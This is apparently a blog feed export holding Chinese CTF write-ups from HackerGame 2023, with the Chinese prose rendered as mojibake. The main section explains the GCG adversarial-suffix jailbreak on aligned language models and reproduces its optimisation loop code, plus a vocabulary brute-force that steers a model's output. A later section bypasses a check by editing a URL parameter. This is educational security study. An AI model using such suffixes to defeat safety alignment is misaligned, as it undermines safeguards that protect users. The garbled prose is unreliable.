class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">message</span>):</span><br><span class="line">    model_inputs = tokenizer.encode(message, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">    model_outputs = model.generate(</span><br><span class="line">        model_inputs,</span><br><span class="line">        max_new_tokens=<span class="number">30</span>,</span><br><span class="line">        num_beams=<span class="number">1</span>,</span><br><span class="line">        pad_token_id=tokenizer.eos_token_id,</span><br><span class="line">    )</span><br><span class="line">    model_outputs = model_outputs[<span class="number">0</span>, <span class="built_in">len</span>(model_inputs[<span class="number">0</span>]):]</span><br><span class="line">    model_output_text = tokenizer.decode(</span><br><span class="line">        model_outputs, skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> model_output_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> word, token_id <span class="keyword">in</span> tqdm(tokenizer.get_vocab().items()):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;accepted&#x27;</span> <span class="keyword">in</span> predict(word).lower():</span><br><span class="line">        <span class="built_in">print</span>(word, token_id)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç å°±æ˜¯æšä¸¾æ¨¡å‹è¯è¡¨é‡Œçš„æ¯ä¸€ä¸ªå•è¯è¯å…¸,çœ‹çœ‹å“ªä¸ªè¯èƒ½è®© ai ç”Ÿæˆ <code>accepted</code>.</p><p>è·‘ä¸Šé¢æ¨¡å‹ç”Ÿæˆçš„ç»“æœä¹‹ä¸€ä¸º<code>atively</code>,ç»“æœä¸º:</p><p><img src="/2023/11/05/HackerGame2023-LLM/image-1.png"></p><h2 id="ç¬¬-3-4-ä¸ª-flag"><a href="#ç¬¬-3-4-ä¸ª-flag" class="headerlink" title="ç¬¬ 3-4 ä¸ª flag"></a>ç¬¬ 3-4 ä¸ª flag</h2><p>ä»¥ä¸Šä¸¤ä¸ªéƒ½æ˜¯é€šè¿‡æ‰¾è§„å¾‹è·å¾—çš„ç­”æ¡ˆ,æ¥ä¸‹æ¥ä¼šè®¤çœŸè§£æç¬¬ä¸‰é¢˜å’Œç¬¬å››é¢˜,ä¹Ÿæ˜¯æ‹‰å¼€åŒºåˆ†åº¦çš„é¢˜ç›®,è¿™ä¸¤é“é¢˜çš„é¢˜ç›®åŸå‹éƒ½æ˜¯ <a href="https://llm-attacks.org/">LLM Attack</a></p><h3 id="LLM-è¡¥å……çŸ¥è¯†"><a href="#LLM-è¡¥å……çŸ¥è¯†" class="headerlink" title="LLM è¡¥å……çŸ¥è¯†"></a>LLM è¡¥å……çŸ¥è¯†</h3><p>åœ¨äº†è§£ LLM Attack ä¹‹å‰,éœ€è¦å¯¹å¤§æ¨¡å‹åšéå¸¸ç®€è¦çš„è¡¥å……çŸ¥è¯†ã€‚</p><p>å¤§æ¨¡å‹åŸºäº Transformer æ¡†æ¶, Transformer æ¶æ„å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†:</p><h4 id="è¾“å…¥è¾“å‡ºéƒ¨åˆ†"><a href="#è¾“å…¥è¾“å‡ºéƒ¨åˆ†" class="headerlink" title="è¾“å…¥è¾“å‡ºéƒ¨åˆ†"></a>è¾“å…¥è¾“å‡ºéƒ¨åˆ†</h4><ul><li>å°†è¾“å…¥å•è¯è½¬æ¢ä¸ºone hotç¼–ç éƒ¨åˆ†</li><li>å°† one hot é™ç»´æˆå‘é‡çš„ Embedding åµŒå…¥éƒ¨åˆ†</li><li>Transformer æ²¡æœ‰é€’å½’ç»“æ„, æ‰€ä»¥æœ‰è®°å½•å•è¯å‡ºç°é¡ºåºçš„ä½ç½®ç¼–ç éƒ¨åˆ†</li></ul><h4 id="ç¼–ç å™¨éƒ¨åˆ†"><a href="#ç¼–ç å™¨éƒ¨åˆ†" class="headerlink" title="ç¼–ç å™¨éƒ¨åˆ†"></a>ç¼–ç å™¨éƒ¨åˆ†</h4><p>ç¼–ç å™¨ç”±å¤šä¸ªç›¸åŒçš„å±‚å †å è€Œæˆï¼Œæ¯ä¸€å±‚åŒ…å«ä¸¤ä¸ªä¸»è¦éƒ¨åˆ†ï¼š</p><ul><li><strong>è‡ªæ³¨æ„åŠ›å±‚</strong>: åœ¨è¿™ä¸€å±‚ä¸­,å¯¹äºæ¯ä¸ªå•è¯,æ¨¡å‹å­¦ä¹ ä¸‰ä¸ªå‘é‡:æŸ¥è¯¢(Query),é”®(Key),å€¼(Value)ã€‚å…¶ä¸­ Query æ˜¯ä½ ç›®å‰æŸ¥è¯¢åˆ°çš„è¯çš„å‘é‡, Key æ˜¯æ¯ä¸€ä¸ªè¯çš„å‘é‡,Value å°±æ˜¯ Key å¯¹åº”çš„åŠ æƒå€¼,åœ¨è¿™ä¸€å±‚ä¸­ä¼šè®¡ç®—ä¸€ä¸ªæ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µ,æ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µä¸ºæŸ¥è¯¢å‘é‡å’Œæ¯ä¸€ä¸ªé”®å‘é‡çš„ç‚¹ä¹˜,ç„¶åå°†æ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µåšsoftmaxè®¡ç®—å¾—åˆ°åŠ æƒå€¼å¹¶åº”ç”¨åˆ° valueã€‚</li><li><strong>å‰é¦ˆå…¨é“¾æ¥å±‚</strong>:å…¨é“¾æ¥å±‚ç”± sigmoid+relu+sigmoid ç»„æˆ,ç”¨äºå°†è‡ªæ³¨æ„åŠ›å±‚çš„è¾“å‡ºç»“æœåšéçº¿æ€§å˜æ¢,ä½¿å¾—æ¨¡å‹èƒ½å¤Ÿå­¦ä¹ åˆ°æ›´åŠ å¤æ‚çš„ç‰¹å¾</li></ul><p>å¯¹äºæ¯ä¸ªå­å±‚ä¸­éƒ½æœ‰æ®‹å·®è¿æ¥ï¼ˆResidual Connectionï¼‰å’Œå±‚å½’ä¸€åŒ–ï¼ˆLayer Normalizationï¼‰ï¼Œè¿™æœ‰åŠ©äºé˜²æ­¢è®­ç»ƒè¿‡ç¨‹ä¸­çš„æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ã€‚</p><p>åœ¨è¿™é‡Œ,æœ‰å¤šä¸ªè¿™æ ·çš„å±‚,æ¯ä¸ªå±‚åˆç§°ä¸ºæ¯ä¸ªå¤´,å¤šä¸ªå¤´å¹¶è¡Œå·¥ä½œ,æ¯ä¸ªå¤´å­¦ä¹ åˆ°ä¸åŒå…³è”,æœ€åå†å †å ,è¿™åˆè¢«ç§°ä¸ºå¤šå¤´æ³¨æ„åŠ›æœºåˆ¶ã€‚</p><h4 id="è§£ç å™¨éƒ¨åˆ†"><a href="#è§£ç å™¨éƒ¨åˆ†" class="headerlink" title="è§£ç å™¨éƒ¨åˆ†"></a>è§£ç å™¨éƒ¨åˆ†</h4><p>è¿›å…¥è§£ç å™¨å,ä»–æ˜¯ä¸€ä¸ªä¸€ä¸ªå•è¯ç¼–ç å¼€å§‹è¯»å–çš„ã€‚è§£ç å™¨ä¹Ÿç”±å¤šä¸ªç›¸åŒçš„å±‚å †å è€Œæˆï¼Œä½†æ¯ä¸€å±‚æœ‰ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š</p><ul><li><strong>è‡ªæ³¨æ„åŠ›å±‚</strong>: åœ¨è¿™ä¸€å±‚ï¼Œè§£ç å™¨<strong>é¦–æ¬¡å°è¯•</strong>ç†è§£å·²ç»ç”Ÿæˆçš„è¾“å‡ºåºåˆ—ä¸­çš„å…³ç³»,é€šè¿‡è§£æç¼–ç å™¨ä¼ æ¥çš„å‘é‡,ä¸ç¼–ç å™¨ä¸­çš„è‡ªæ³¨æ„åŠ›å±‚ç›¸åŒ,ä¼šç”Ÿæˆä¸€ä¸ªè¾“å‡ºçš„æ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µ,æ³¨æ„è¿™é‡Œä¸ºäº†é¿å…ä»–å»è®¡ç®—æœªæ¥(å³è¯¥å•è¯å³è¾¹çš„å•è¯)çš„åˆ†æ•°,ä¼šç”¨åŠ ä¸Šä¸€ä¸ª mask çŸ©é˜µ(mask çŸ©é˜µä¸­æœªæ¥çš„éƒ¨åˆ†å…¨éƒ½æ˜¯-inf),ç„¶åé€šè¿‡ sotfmax è·å¾—åŠ æƒåçš„ç»“æœ(mask éƒ¨åˆ†ä¸º 0)ã€‚å¾—åˆ°æƒé‡å†åº”ç”¨äº Valueã€‚</li><li><strong>ç¼–ç å™¨-è§£ç å™¨æ³¨æ„åŠ›å±‚</strong>: åœ¨è¿™ä¸€å±‚,è§£ç å™¨ä¼šä»¥è‡ªå·±è‡ªæ³¨æ„åŠ›å±‚çš„è¾“å‡ºä½œä¸º Query,ç¼–ç å™¨çš„è¾“å‡ºä½œä¸º Key å’Œ Value,ç„¶åè®¡ç®—æ³¨æ„åŠ›å¾—åˆ†,æœ€åé€šè¿‡ softmax å‡½æ•°è¿›è¡Œå½’ä¸€åŒ–å¤„ç†,å¾—åˆ°æƒé‡å†åº”ç”¨äº Valueã€‚è¯¥å±‚çš„ä¸»è¦ç›®çš„æ˜¯è®©è§£ç å™¨èƒ½å¤Ÿå†³å®šåœ¨ç”Ÿæˆä¸‹ä¸€ä¸ªtokenæ—¶åº”è¯¥â€œå…³æ³¨â€è¾“å…¥åºåˆ—çš„å“ªä¸ªéƒ¨åˆ†ã€‚</li><li><strong>å‰é¦ˆå…¨é“¾æ¥å±‚</strong>:ä¸ç¼–ç å™¨éƒ¨åˆ†çš„ä¸€è‡´,åšéçº¿æ€§å˜æ¢ã€‚</li></ul><p>è§£ç å™¨çš„æ¯ä¸ªå­å±‚åŒæ ·æœ‰æ®‹å·®è¿æ¥å’Œå±‚å½’ä¸€åŒ–ã€‚</p><h4 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h4><p>æœ€åï¼Œè§£ç å™¨çš„è¾“å‡ºé€šè¿‡ä¸€ä¸ªçº¿æ€§å±‚ï¼Œç„¶åæ˜¯ä¸€ä¸ªSoftmaxå±‚ï¼Œä»¥é¢„æµ‹ä¸‹ä¸€ä¸ªå•è¯çš„<strong>æ¦‚ç‡åˆ†å¸ƒ</strong>ã€‚</p><h3 id="LLM-Attack"><a href="#LLM-Attack" class="headerlink" title="LLM Attack"></a>LLM Attack</h3><p>è®ºæ–‡è¿æ¥: <a href="https://arxiv.org/abs/2307.15043">Universal and Transferable Adversarial Attacks on Aligned Language Models</a></p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><strong>å¤§ç™½è¯: é€šè¿‡ç»™ç”¨æˆ·çš„è¾“å…¥å†…å®¹åŠ å…¥åˆé€‚çš„åç¼€,ä½¿å¾—å¤§æ¨¡å‹è¯´å‡ºé‚£äº›ä¸è¯¥è¯´å‡ºçš„è¯</strong></p><p>å‚è€ƒäº†å®˜æ–¹çš„è¯´æ³•:</p><p> LLM å°†ä¸€ä¸² token $x_{1:n}$ æ˜ å°„åˆ°ä¸‹ä¸€ä¸ª token $x_{n+1}$ã€‚LLM æ‰€éœ€è¦å­¦ä¹ çš„æ˜¯åœ¨ç»™å®šä¹‹å‰çš„ token $x_{1:n}$ ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ª token $x_{n+1}$ çš„æ¦‚ç‡ $p(x_{n+1} | x_{1:n})$ã€‚å…¶ä¸­æ¯ä¸€ä¸ª $x_i \in {1, â€¦ V}$ éƒ½æ˜¯è¯è¡¨ä¸­çš„ä¸€ä¸ª tokenã€‚å¦‚æœæƒ³è¦è®©æ¨¡å‹è¾“å…¥ä¸€æ®µåºåˆ—ï¼Œåºåˆ—ä¸­æ¯ä¸€ä¸ª token éƒ½åªä¸ä¹‹å‰çš„æ‰€æœ‰ token æœ‰å…³ï¼Œå› æ­¤æ¨¡å‹è¾“å‡ºä¸€æ®µåºåˆ— $x_{n+1:n+H}$ çš„æ¦‚ç‡ä¸º</p><p>$$p(x_{n+1:n+H}|x_{1:n}) &#x3D; \prod_{i&#x3D;1}^H p(x_{n+i} | x_{1:n+i-1})$$</p><p>è¿™é‡Œåšäº†æ¦‚ç‡ç´¯ä¹˜æ¥å åŠ æ¦‚ç‡ã€‚</p><p>é‚£ä¹ˆæ ¹æ®è¿™ä¸ªå…¬å¼,å¦‚æœæˆ‘ä»¬æƒ³è®© LLM è¾“å‡ºæŒ‡å®šæ ¼å¼çš„å­åºåˆ—,é‚£ä¹ˆå°±è¦è®©è¿™ä¸ªå­åºåˆ—çš„æ¦‚ç‡å°½å¯èƒ½å¤§,å³ $p(x_{n+1:n+H}|x_{1:n})$ å°½å¯èƒ½é«˜,é‚£ä¹ˆè¿™å°±å¯ä»¥è½¬æ¢æˆä¸€ä¸ªä¼˜åŒ–é—®é¢˜,é€šè¿‡æ¢¯åº¦ä¸‹é™è®¡ç®—æ¢¯åº¦å‡å°‘æŸå¤±:<br>$$\mathcal{L}(x_{1:n}) &#x3D; -\log p(x^\star_{n+1:n+H} | x_{1:n})$$</p><p>è¿™é‡Œçš„ $x^\star_{n+1:n+H}$ å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŒ‡å®šçš„è¾“å‡ºåºåˆ—ã€‚</p><p>ä½†ç”±äº LLM æ˜¯å¯¹ç¦»æ•£çš„ token åšå¤„ç†,æ— æ³•è®°å½•è¿ç»­çš„å˜åŒ–,æ‰€ä»¥è®ºæ–‡çš„ä½œè€…å‚è€ƒäº† AutoPrompt , é€šè¿‡è´ªå©ªåæ ‡ä¸‹é™(greedy coordinate descent)çš„æ–¹æ³•æ¥å¯¹ç¦»æ•£è¾“å…¥åšä¼˜åŒ–ã€‚ç®—æ³•ä¼ªä»£ç å¦‚ä¸‹:</p><p><img src="/2023/11/05/HackerGame2023-LLM/image-2.png"></p><p>ä½œè€…é¦–å…ˆç”Ÿæˆäº†ä¸€ä¸ª one hot å‘é‡æ¥ä»£è¡¨ token,ä¹‹åå°†è¯¥ one hot å‘é‡ä¹˜ä¸Šå¯¹åº”æ¨¡å‹çš„ embedding layer çŸ©é˜µé™ç»´, ç„¶åå†è¾“å…¥ç»™æ¨¡å‹è®©ä»–æ¥åšæ¢¯åº¦ä¸‹é™,ç»è¿‡æ¨¡å‹åå‘ä¼ æ’­å,ä¼šå¾—åˆ° one hot å¯¹åº”çš„æ¢¯åº¦å‘é‡(æ¯ä¸ªä½ç½®éƒ½æœ‰ä¸€ä¸ªæ¢¯åº¦),è¿™é‡Œç”¨  $grad_i$ è¡¨ç¤ºç¬¬ $i$ ä¸ªä½ç½®çš„æ¢¯åº¦, å¦‚æœ $grad_i$ &lt; 0,å°±ä»£è¡¨è¿™ä¸ªä½ç½®çš„tokenèƒ½å¤Ÿä½¿å¾—æŸå¤±ä¸‹é™,å°†åŸæœ¬çš„ token æ›¿æ¢ä¸ºè¯è¡¨ä¸­çš„ç¬¬ $i$ ä¸ª tokenã€‚ç®—æ³•è¿™é‡Œçš„ $top-k$æ˜¯æŒ‡åœ¨è¾“å‡º token ä¸­é€‰æ‹©æœ€å°çš„ $k$ ä¸ªæ¢¯åº¦å’Œå¯¹åº”çš„ $i$</p><p>åœ¨è®ºæ–‡ä»£ç æä¾›çš„ demo ç¨‹åºä¸­, å®é™…ä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">plotlosses = PlotLosses()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœä¸å…è®¸éASCIIå­—ç¬¦ï¼Œåˆ™è®¾ç½®ä¸€ä¸ªéASCIIå­—ç¬¦çš„ç¦ç”¨åˆ—è¡¨</span></span><br><span class="line">not_allowed_tokens = <span class="literal">None</span> <span class="keyword">if</span> allow_non_ascii <span class="keyword">else</span> get_nonascii_toks(tokenizer)</span><br><span class="line">adv_suffix = adv_string_init  <span class="comment"># åˆå§‹åŒ–å¯¹æŠ—æ€§åç¼€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹å¤šæ­¥è¿­ä»£è¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ­¥éª¤1ï¼šå°†ç”¨æˆ·æç¤ºï¼ˆè¡Œä¸º + å¯¹æŠ—æ€§åç¼€ï¼‰ç¼–ç ä¸ºtokensï¼Œå¹¶è¿”å›token idã€‚</span></span><br><span class="line">    input_ids = suffix_manager.get_input_ids(adv_string=adv_suffix)</span><br><span class="line">    input_ids = input_ids.to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ­¥éª¤2ï¼šè®¡ç®—åæ ‡æ¢¯åº¦</span></span><br><span class="line">    coordinate_grad = token_gradients(model, </span><br><span class="line">                    input_ids, </span><br><span class="line">                    suffix_manager._control_slice, </span><br><span class="line">                    suffix_manager._target_slice, </span><br><span class="line">                    suffix_manager._loss_slice)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ­¥éª¤3ï¼šæ ¹æ®åæ ‡æ¢¯åº¦é‡‡æ ·ä¸€æ‰¹æ–°çš„tokensã€‚</span></span><br><span class="line">    <span class="comment"># æ³¨æ„æˆ‘ä»¬åªéœ€è¦é‚£äº›ä½¿æŸå¤±æœ€å°åŒ–çš„tokensã€‚</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ­¥éª¤3.1ï¼šåˆ‡ç‰‡è¾“å…¥ä»¥å®šä½å¯¹æŠ—æ€§åç¼€ã€‚</span></span><br><span class="line">        adv_suffix_tokens = input_ids[suffix_manager._control_slice].to(device)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ­¥éª¤3.2ï¼šéšæœºé‡‡æ ·ä¸€æ‰¹æ›¿æ¢tokensã€‚</span></span><br><span class="line">        new_adv_suffix_toks = sample_control(adv_suffix_tokens, </span><br><span class="line">                       coordinate_grad, </span><br><span class="line">                       batch_size, </span><br><span class="line">                       topk=topk, </span><br><span class="line">                       temp=<span class="number">1</span>, </span><br><span class="line">                       not_allowed_tokens=not_allowed_tokens)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ­¥éª¤3.3ï¼šç¡®ä¿æ‰€æœ‰å¯¹æŠ—æ€§å€™é€‰è€…æœ‰ç›¸åŒæ•°é‡çš„tokensã€‚</span></span><br><span class="line">        <span class="comment"># å› ä¸ºtokenizersä¸æ˜¯å¯é€†çš„ï¼ŒEncode(Decode(tokens))å¯èƒ½äº§ç”Ÿä¸åŒçš„tokenizationã€‚</span></span><br><span class="line">        <span class="comment"># æˆ‘ä»¬ç¡®ä¿tokensæ•°é‡ä¸å˜ï¼Œä»¥é˜²æ­¢å†…å­˜æŒç»­å¢é•¿å¹¶é€ æˆOOMï¼ˆå†…å­˜æº¢å‡ºï¼‰ã€‚</span></span><br><span class="line">        new_adv_suffix = get_filtered_cands(tokenizer, </span><br><span class="line">                                            new_adv_suffix_toks, </span><br><span class="line">                                            filter_cand=<span class="literal">True</span>, </span><br><span class="line">                                            curr_control=adv_suffix)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ­¥éª¤3.4ï¼šåœ¨è¿™äº›å€™é€‰è€…ä¸Šè®¡ç®—æŸå¤±ï¼Œå¹¶å–æœ€å°å€¼ã€‚</span></span><br><span class="line">        logits, ids = get_logits(model=model, </span><br><span class="line">                                 tokenizer=tokenizer,</span><br><span class="line">                                 input_ids=input_ids,</span><br><span class="line">                                 control_slice=suffix_manager._control_slice, </span><br><span class="line">                                 test_controls=new_adv_suffix, </span><br><span class="line">                                 return_ids=<span class="literal">True</span>,</span><br><span class="line">                                 batch_size=<span class="number">512</span>)  <span class="comment"># å¦‚æœå‘ç”ŸOOMï¼Œè¯·å‡å°‘è¿™ä¸ªæ•°å­—ã€‚</span></span><br><span class="line"></span><br><span class="line">        losses = target_loss(logits, ids, suffix_manager._target_slice)</span><br><span class="line"></span><br><span class="line">        best_new_adv_suffix_id = losses.argmin()</span><br><span class="line">        best_new_adv_suffix = new_adv_suffix[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        current_loss = losses[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”¨æœ€ä½³å€™é€‰è€…æ›´æ–°è¿è¡Œä¸­çš„å¯¹æŠ—æ€§åç¼€</span></span><br><span class="line">        adv_suffix = best_new_adv_suffix</span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ˜¯å¦æˆåŠŸè¿›è¡Œäº†æ”»å‡»</span></span><br><span class="line">        is_success = check_for_attack_success(model, </span><br><span class="line">                                 tokenizer,</span><br><span class="line">                                 suffix_manager.get_input_ids(adv_string=adv_suffix).to(device), </span><br><span class="line">                                 suffix_manager._assistant_role_slice, </span><br><span class="line">                                 test_prefixes)</span><br></pre></td></tr></table></figure><p>å®˜æ–¹ç»™çš„ç¤ºä¾‹ä»£ç ä¸­,å¡«è¡¥ä¸Šäº† import éƒ¨åˆ†çš„ä»£ç ,ç„¶åå°†ç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†æ»ç©º,åç¼€è®¾ç½®ä¸ºå„è‡ªå¯¹åº”æœ€å¤§é•¿åº¦çš„ â€˜!â€™</p><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p>æœ€åç”Ÿæˆå‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹:</p><p><img src="/2023/11/05/HackerGame2023-LLM/image-4.png"></p><p><img src="/2023/11/05/HackerGame2023-LLM/image-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> HackerGame </category>
          
          <category> 2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€HackerGame2023ã€‘ WriteUp</title>
      <link href="/2023/11/04/HackerGame2023/"/>
      <url>/2023/11/04/HackerGame2023/</url>
      
        <content type="html"><![CDATA[<h1 id="HackerGame-2023-WriteUp"><a href="#HackerGame-2023-WriteUp" class="headerlink" title="HackerGame 2023 WriteUp"></a>HackerGame 2023 WriteUp</h1><h2 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h2><p>ä»Šå¹´ hackergame åœ†æ»¡ç»“æŸï¼Œå¾ˆäº«å—çš„ä¸€æ¬¡æ—…ç¨‹ï¼ˆåŒæ—¶ä¹Ÿæœ‰ç‚¹æŠ˜ç£¨ QAQï¼‰ï¼Œhackergame è¿™ä¸€ä¸ªæ˜ŸæœŸ ddl æŒºå¤šçš„ï¼Œæ‰€ä»¥æœ¬æ¬¡åæ¬¡å¹¶ä¸é«˜ï¼Œæ ¡å†… 15 åï¼Œæ€»æ’å 226ï¼Œè¿™ç¯‡åšå®¢è®°å½•çš„ä¸ä»…ä»…æ˜¯è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®çš„ WPï¼ŒåŒæ—¶ä¹Ÿå¯¹å®˜æ–¹é¢˜è§£å’Œæˆ‘æ„Ÿå…´è¶£çš„é¢˜ç›®åšä¸€ä¸ª logï¼Œå­¦ä¹ å¤šç‚¹çŸ¥è¯†ã€‚</p><h2 id="WP-éƒ¨åˆ†"><a href="#WP-éƒ¨åˆ†" class="headerlink" title="WP éƒ¨åˆ†"></a>WP éƒ¨åˆ†</h2><h3 id="HackerGame-å¯åŠ¨"><a href="#HackerGame-å¯åŠ¨" class="headerlink" title="HackerGame å¯åŠ¨"></a>HackerGame å¯åŠ¨</h3><p>ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€é¢˜ç›®åè®©ä½ å¤§å£°å–Šå‡º hackergame å¯åŠ¨ï¼è¦æ±‚å‡†ç¡®ç‡åˆ°è¾¾ç™¾åˆ†ä¹‹ 99.99%ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä¸Šä¼ çš„æ—¶å€™å‘ç°ä»–æ˜¯åœ¨ url ä¼ å‚çš„ï¼Œæ”¹ä¸€ä¸‹å‚æ•°(simularity&#x3D;99.999)å°±è¿‡äº†ã€‚</p><p><img src="/2023/11/04/HackerGame2023/1.png"></p><h3 id="çŒ«å’ªå°æµ‹"><a href="#çŒ«å’ªå°æµ‹" class="headerlink" title="çŒ«å’ªå°æµ‹"></a>çŒ«å’ªå°æµ‹</h3><p>ä»Šå¹´çŒ«å’ªå°æµ‹ä¸€å…±æœ‰å››é“é¢˜ï¼š</p><p><code>1. æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿï¼ˆæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼‰ </code></p><p>ç­”ï¼šè¿™é“é¢˜ç»™äº†æç¤ºæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œè€Œä¸”å›¾ä¹¦é¦†ä¸ä¼šå¾ˆé«˜ï¼Œç›´æ¥ 0-20 çˆ†ç ´å°±è¡Œäº†ã€‚</p><p><code>2. ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿï¼ˆæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼‰ </code></p><p>æ‰¾å­¦æœ¯è®ºæ–‡è¿™é‡Œç”¨ä¸­æ–‡ä¸€å®šæ˜¯ä¸å¯è¡Œçš„ï¼Œç”¨ chatgpt ç¿»è¯‘æˆè‹±è¯­ï¼šâ€œThe upper limit of the density of chickens in the observable universeâ€ï¼Œä¹‹åå†è°·æ­Œæœç´¢å³å¯å¾—åˆ°è®ºæ–‡ï¼Œç­”æ¡ˆæ˜¯ 23ã€‚</p><p><code>3. ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ(è¾“å…¥æ ¼å¼ä¸º CONFIG_XXXXX)</code></p><p>é—® chatgptï¼Œç­”æ¡ˆä¸º CONFIG_TCP_CONG_BBRã€‚</p><p><code>4. ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ MyPY mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿï¼ˆä¼šè®®çš„å¤§å†™è‹±æ–‡ç®€ç§°ï¼Œæ¯”å¦‚ ISCAã€CCSã€ICMLã€‚ï¼‰</code></p><p>æˆ‘çš„åšæ³•æ˜¯ç›´æ¥çˆ†ç ´æ‰€æœ‰çš„å’Œ python 